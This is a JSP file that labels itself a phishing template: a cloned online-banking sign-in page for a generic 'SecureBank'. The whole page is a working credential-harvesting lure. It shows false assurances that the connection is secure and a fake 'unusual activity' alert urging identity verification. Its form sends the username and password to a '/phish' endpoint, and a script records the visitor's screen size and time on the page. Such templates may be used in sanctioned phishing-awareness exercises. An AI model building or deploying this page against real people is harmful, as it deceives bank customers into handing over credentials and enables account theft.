<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%-- PHISHING TEMPLATE: Generic Online Banking Clone --%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureBank Online — Sign In</title>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin:0; padding:0; }
        body { font-family: 'Source Sans Pro', sans-serif; background: #f4f6f8; min-height:100vh; }
        .top-bar {
            background: #003366;
            padding: 10px 40px;
            display: flex; justify-content: space-between; align-items: center;
        }
        .bank-logo { color: #fff; font-size: 22px; font-weight: 600; letter-spacing: 1px; }
        .bank-logo span { color: #ffd700; }
        .nav-links a { color: #a0b8d0; font-size: 13px; margin-left: 20px; text-decoration: none; }
        .hero-bar { background: #004080; padding: 8px 40px; }
        .hero-bar p { color: #a0c4e0; font-size: 12px; }
        .secure-icon { color: #90ee90; margin-right: 6px; }
        .page-body { display: flex; align-items: flex-start; justify-content: center; gap: 30px; padding: 50px 40px; }
        .login-box {
            background: #fff; border: 1px solid #d0d8e0;
            border-radius: 4px; width: 380px; overflow: hidden;
            box-shadow: 0 2px 8px rgba(0,0,0,.1);
        }
        .login-box-header {
            background: #003366; color: #fff;
            padding: 16px 24px; font-size: 16px; font-weight: 600;
        }
        .login-box-body { padding: 28px 24px; }
        label { display:block; font-size:13px; color:#444; margin-bottom:4px; font-weight:600; }
        input {
            width:100%; padding:10px 12px;
            border:1px solid #b0bec5; border-radius:3px;
            font-size:14px; margin-bottom:16px; outline:none;
        }
        input:focus { border-color: #003366; box-shadow: 0 0 0 2px rgba(0,51,102,.15); }
        .btn-signin {
            width:100%; background:#003366; color:#fff;
            border:none; border-radius:3px; padding:12px;
            font-size:15px; font-weight:600; cursor:pointer;
            letter-spacing:.5px;
        }
        .btn-signin:hover { background: #00254d; }
        .links-row { display:flex; justify-content:space-between; margin-top:14px; }
        .links-row a { font-size:12px; color:#003366; text-decoration:none; }
        .links-row a:hover { text-decoration:underline; }
        .security-notice {
            margin-top:18px; padding:12px; background:#f0f7ff;
            border:1px solid #b8d4f0; border-radius:3px; font-size:12px; color:#555;
        }
        .security-notice .lock { color:#003366; margin-right:4px; }
        .info-panel { width: 300px; }
        .info-card { background:#fff; border:1px solid #d0d8e0; border-radius:4px; padding:20px; margin-bottom:16px; }
        .info-card h3 { font-size:15px; color:#003366; margin-bottom:10px; }
        .info-card p { font-size:13px; color:#666; line-height:1.6; }
        footer { background:#003366; color:#8aabcc; text-align:center; padding:14px; font-size:12px; }
        footer a { color:#8aabcc; text-decoration:none; margin:0 8px; }
    </style>
</head>
<body>
<div class="top-bar">
    <div class="bank-logo">Secure<span>Bank</span> Online</div>
    <div class="nav-links">
        <a href="#">Personal</a><a href="#">Business</a><a href="#">Wealth</a><a href="#">Help</a>
    </div>
</div>
<div class="hero-bar">
    <p><span class="secure-icon">🔒</span>Your connection to SecureBank is encrypted and secure</p>
</div>

<div class="page-body">
    <div class="login-box">
        <div class="login-box-header">🔐 Online Banking Sign In</div>
        <div class="login-box-body">
            <form method="post" action="${pageContext.request.contextPath}/phish">
                <input type="hidden" name="screenSize" id="screenSize" value="">
                <input type="hidden" name="timeOnPage" id="timeOnPage" value="0">

                <label>Customer ID / Username</label>
                <input type="text" name="username" placeholder="Enter your Customer ID" required autofocus>

                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your Password" required>

                <button type="submit" class="btn-signin">Sign In →</button>

                <div class="links-row">
                    <a href="#">Forgot Password?</a>
                    <a href="#">Register / Enroll</a>
                </div>

                <div class="security-notice">
                    <span class="lock">🔒</span>
                    For your security, always ensure the address bar shows <strong>https://</strong> before entering your credentials.
                </div>
            </form>
        </div>
    </div>

    <div class="info-panel">
        <div class="info-card">
            <h3>⚠ Security Alert</h3>
            <p>We have detected unusual activity on accounts in your region. Please verify your identity to continue.</p>
        </div>
        <div class="info-card">
            <h3>📞 24/7 Support</h3>
            <p>Call us at: 1-800-555-0123<br>Available 24 hours, 7 days a week.</p>
        </div>
    </div>
</div>

<footer>
    <a href="#">Privacy Policy</a> <a href="#">Terms of Use</a> <a href="#">Security Center</a>
    <a href="#">Accessibility</a><br>
    © 2024 SecureBank NA. All rights reserved. Member FDIC. Equal Housing Lender.
</footer>

<script>
    const startTime = Date.now();
    document.getElementById('screenSize').value = window.screen.width + 'x' + window.screen.height;
    document.querySelector('form').addEventListener('submit', function() {
        document.getElementById('timeOnPage').value = Math.floor((Date.now() - startTime) / 1000);
    });
</script>
</body>
</html>
